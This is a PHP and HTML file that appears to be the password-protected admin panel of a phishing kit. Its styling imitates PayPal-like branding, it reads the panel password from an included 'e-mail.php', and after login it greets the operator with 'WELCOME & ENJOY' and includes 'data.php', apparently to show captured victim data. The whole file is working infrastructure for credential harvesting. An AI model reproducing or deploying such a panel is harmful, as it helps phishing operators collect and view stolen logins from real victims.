<!DOCTYPE html>
<html>
<head><style type="text/css">*{padding: 0;margin: 0;box-sizing: border-box;}a:active,a:visited{color: red}</style>
<?php


@session_start();
@set_time_limit(0);

$create_password = true;
include("../e-mail.php");
$password = $adminPass ;
@$pass=$_POST['pass'];
if($pass==$password){
$_SESSION['nst']="$pass";
}

if($create_password==true){

if(!isset($_SESSION['nst']) or $_SESSION['nst']!=$password){
die('

</head>
<body>
    <div style="background-color: blue;height:100%;min-height: 100vh;width:100%;background-color: #009cde;background-image: radial-gradient(circle farthest-side at center bottom,#009cde,#003087 125%);padding: 25px 0">
        <div style="margin: 0 auto;width:600px;border:2px solid white;padding: 20px;">
            <div>
                <img src="https://i.imgur.com/vtGfl4n.png" style="height: 50px;margin:0 auto;display: block;">
            </div>

            <h1 style="color: #fff;text-align: center;padding: 20px 0;font-family: arial;">ADMIN PANEL</h1>
            <div>
                <form method="post">
                    <div style="margin: 15px auto;width: 300px;">
                        <input style="display: block;width: 100%;height: 40px;margin: 5px 0;border: none;background-color: #fff;font-size: 20px;padding: 0 20px;" type="password" name="pass">
                        <input style="display: block;width: 100%;height: 40px;margin: 15px 0;border: none;background-color: #008bd0;color: #fff;font-weight: bold;text-transform: uppercase;cursor: pointer;" type="submit" name="" value="LOGIN">
                    </div>
                </form>
            </div>
        </div>
    </div>
</body>
</html>



');}

}

?>
</head>
<body>
    <div style="background-color: blue;height:100%;min-height: 100vh;width:100%;background-color: #009cde;background-image: radial-gradient(circle farthest-side at center bottom,#009cde,#003087 125%);padding: 25px 0">
        <div style="margin: 0 auto;width:600px;border:2px solid white;padding: 20px;">
            <div>
                <img src="https://i.imgur.com/vtGfl4n.png" style="height: 50px;margin:0 auto;display: block;">
            </div>

            <h1 style="color: #fff;text-align: center;padding: 20px 0;font-family: arial;">WELCOME & ENJOY</h1>
            <div>
                <form method="post">
                    <div style="margin: 15px auto;width: 400px;background-color: #fff;padding: 35px 0 20px 0;text-align: center;">
                        <?php include("data.php"); ?>
                    </div>
                </form>
            </div>
        </div>
    </div>
</body>
</html>